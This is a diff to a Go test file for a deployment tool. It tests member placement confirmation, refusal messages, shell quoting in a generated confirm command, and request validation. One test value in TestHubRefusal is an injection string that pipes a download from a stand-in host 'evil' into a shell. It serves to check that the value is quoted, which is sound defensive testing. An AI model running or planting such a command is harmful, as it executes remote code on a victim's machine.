@@ -107,14 +107,31 @@ func TestMemberPlacementRemovedNeverPlaced(t *testing.T) {
 }
 
 func TestMemberPlacementConfirmedBy(t *testing.T) {
+	both := delivery.RequestPlacement{Source: delivery.RequestPlacedAdvertised, Members: []string{euUID, usUID}}
 	reqs := []delivery.VerifiedRequest{
-		{Request: delivery.OperationRequest{Service: billing, Environment: "prod", Requester: "oidc:bob@acme.com"}, SignedAt: reqSigned},
-		{Request: delivery.OperationRequest{Service: billing, Environment: "production", Requester: "oidc:alice@acme.com"}, SignedAt: reqSigned.Add(time.Minute)},
-		{Request: delivery.OperationRequest{Service: billing, Environment: "staging", Requester: "oidc:carol@acme.com"}, SignedAt: reqSigned.Add(time.Hour)},
+		{Request: delivery.OperationRequest{Service: billing, Environment: "prod", Requester: "oidc:bob@acme.com", Placement: both}, SignedAt: reqSigned},
+		{Request: delivery.OperationRequest{Service: billing, Environment: "production", Requester: "oidc:alice@acme.com", Placement: both}, SignedAt: reqSigned.Add(time.Minute)},
+		{Request: delivery.OperationRequest{Service: billing, Environment: "staging", Requester: "oidc:carol@acme.com", Placement: both}, SignedAt: reqSigned.Add(time.Hour)},
 	}
 	p := delivery.MemberPlacement(nil, members(), billing, "production", reqs)
 	if p.Source != delivery.RequestPlacedAdvertised || p.ConfirmedBy != "oidc:alice@acme.com" {
 		t.Fatalf("%+v", p)
+	}
+}
+
+// TestMemberPlacementConfirmationCoversPlaced: a request confirms only the
+// advertised placement it named. One signed when only eu-prod was placed,
+// or one a placement policy decided, leaves a placement that now also
+// holds us-prod unconfirmed.
+func TestMemberPlacementConfirmationCoversPlaced(t *testing.T) {
+	for name, pl := range map[string]delivery.RequestPlacement{
+		"older member set": {Source: delivery.RequestPlacedAdvertised, Members: []string{euUID}},
+		"policy placement": {Source: delivery.RequestPlacedPolicy, Members: []string{euUID, usUID}},
+	} {
+		reqs := []delivery.VerifiedRequest{{Request: delivery.OperationRequest{Service: billing, Environment: "production", Requester: "alice", Placement: pl}, SignedAt: reqSigned}}
+		if p := delivery.MemberPlacement(nil, members(), billing, "production", reqs); p.Source != delivery.PlacementUnconfirmed || p.ConfirmedBy != "" {
+			t.Errorf("%s: %+v", name, p)
+		}
 	}
 }
 
@@ -214,8 +231,20 @@ func TestHubRefusal(t *testing.T) {
 	if got := delivery.ConfirmCommand(delivery.Request{Service: "s", Environment: "e"}, ""); !strings.Contains(got, "--to <sha256 digest>") || !strings.Contains(got, "--registry <registry>") {
 		t.Fatal(got)
 	}
+	// The reason and correlation id the plan was made with are carried, and
+	// every value is one shell word.
+	quoted := delivery.Request{Service: "billing", Environment: "production", To: "sha256:ab", Members: []string{"x; curl evil|sh #"},
+		Reason: "INC-42 it's a hotfix", CorrelationID: "INC-42"}
+	if got := delivery.ConfirmCommand(quoted, "zot/acme"); got != `pacto delivery propose --service billing --environment production --to sha256:ab --member 'x; curl evil|sh #' `+
+		`--reason 'INC-42 it'\''s a hotfix' --correlation-id INC-42 --registry zot/acme --confirm` {
+		t.Fatal(got)
+	}
+	if err := delivery.HubRefusal(delivery.RefusalIssuerNotAccepted, "why", req, ""); strings.Contains(err.Error(), "oidc-issuer-url") || !strings.Contains(err.Error(), "--issuer") {
+		t.Fatal(err)
+	}
 	for _, code := range []string{delivery.RefusalMemberRequestNeedsPerson, delivery.RefusalNotAMember, delivery.RefusalStageOrMembers,
-		delivery.RefusalMemberRecorderUnknown, delivery.RefusalDigestRequired, delivery.RefusalMemberTakesNoRequests, delivery.RefusalIssuerNotAccepted} {
+		delivery.RefusalMemberRecorderUnknown, delivery.RefusalDigestRequired, delivery.RefusalMemberTakesNoRequests, delivery.RefusalIssuerNotAccepted,
+		delivery.RefusalPlacementUnknown, delivery.RefusalMemberNotPlaced} {
 		err := delivery.HubRefusal(code, "why", req, "zot/acme")
 		if !strings.HasPrefix(err.Error(), code+": why; next: ") || strings.HasSuffix(err.Error(), "next: ") {
 			t.Fatalf("%s: %v", code, err)
@@ -239,8 +268,13 @@ func TestMemberEnvironments(t *testing.T) {
 	}
 }
 
+// okDigest is a sha256 manifest digest.
+var okDigest = "sha256:" + strings.Repeat("ab", 32)
+
 // TestCheckRequestMode: a Stage or a service and environment, never both
-// or neither; a member request is a promote to a digest.
+// or neither; a member request is a promote to a digest, refused before
+// anything is signed when its record would not check (a short digest, an
+// environment that is no DNS label, a bad correlation id).
 func TestCheckRequestMode(t *testing.T) {
 	for _, c := range []struct {
 		req  delivery.Request
@@ -250,7 +284,10 @@ func TestCheckRequestMode(t *testing.T) {
 		{delivery.Request{Service: "billing"}, delivery.RefusalStageOrMembers},
 		{delivery.Request{Service: "billing", Environment: "prod", Type: delivery.TypeRollback}, delivery.RefusalStageOrMembers},
 		{delivery.Request{Service: "billing", Environment: "prod", To: "1.5.0"}, delivery.RefusalDigestRequired},
-		{delivery.Request{Service: "billing", Environment: "prod", To: "sha256:ab"}, ""},
+		{delivery.Request{Service: "billing", Environment: "prod", To: "sha256:ab"}, delivery.RefusalDigestRequired},
+		{delivery.Request{Service: "billing", Environment: "prod", To: okDigest}, ""},
+		{delivery.Request{Service: "billing", Environment: "Prod_EU", To: okDigest}, delivery.RefusalStageOrMembers},
+		{delivery.Request{Service: "billing", Environment: "prod", To: okDigest, CorrelationID: "bad\x01id"}, delivery.RefusalStageOrMembers},
 		{delivery.Request{Stage: "s", To: "1.5.0"}, ""},
 	} {
 		err := delivery.CheckRequestMode(c.req, "r")
